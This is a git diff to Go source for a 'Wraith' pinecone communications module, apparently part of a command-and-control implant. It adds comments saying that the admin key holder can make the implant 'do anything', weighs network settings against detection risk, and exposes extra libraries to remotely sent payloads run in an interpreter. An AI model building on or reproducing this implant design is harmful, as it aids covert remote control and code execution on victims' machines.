@@ -40,12 +40,41 @@ type ModulePinecomms struct {
 
 	// Configuration properties
 
-	OwnPrivKey   ed25519.PrivateKey
-	AdminPubKey  ed25519.PublicKey
-	ListenTcp    string
-	ListenWs     string
+	// The private key that should be used for this instance of Wraith on
+	// the pinecone network. This MUST NOT be hardcoded and MUST instead
+	// be generated at runtime to prevent clashes. The key is an argument
+	// to allow for various generators.
+	OwnPrivKey ed25519.PrivateKey
+
+	// This value solely decides who has control over this Wraith. The owner
+	// of the matching private key will be able to instruct this Wraith to
+	// do anything.
+	AdminPubKey ed25519.PublicKey
+
+	// Which address (if any) the Wraith should listen on for raw TCP pinecone
+	// connections. Setting this makes the Wraith more detectable but might
+	// improve its chances of successfully connecting to C2.
+	ListenTcp string
+
+	// Which address (if any) the Wraith should listen on for websocket pinecone
+	// connections. Setting this makes the Wraith more detectable but might
+	// improve its chances of successfully connecting to C2.
+	ListenWs string
+
+	// Whether or not the Wraith should use multicast to find other Wraiths on
+	// the local network. Setting this makes the Wraith more detectable but might
+	// improve its chances of successfully connecting to C2.
 	UseMulticast bool
-	StaticPeers  []string
+
+	// Which pinecone peers (if any) the Wraith should immediately connect to on
+	// startup. Note that leaving this blank makes it very difficult for commands
+	// to reach your Wraith. On the other hand, more peers means more network traffic
+	// and higher chances of detection.
+	StaticPeers []string
+
+	// What additional libraries should be available to the payloads.
+	// See documentation on `yaegi extract`.
+	AdditionalSymbols map[string]map[string]reflect.Value
 }
 
 func (m *ModulePinecomms) handleRequest(ctx context.Context, w *libwraith.Wraith, pr radio.Radio, packet proto.Packet) {
@@ -99,6 +128,7 @@ func (m *ModulePinecomms) handleRequest(ctx context.Context, w *libwraith.Wraith
 	i.Use(symbols.SymbolsProto)
 	i.Use(stdlib.Symbols)
 	i.Use(unsafe.Symbols)
+	i.Use(m.AdditionalSymbols)
 
 	var (
 		response     []byte
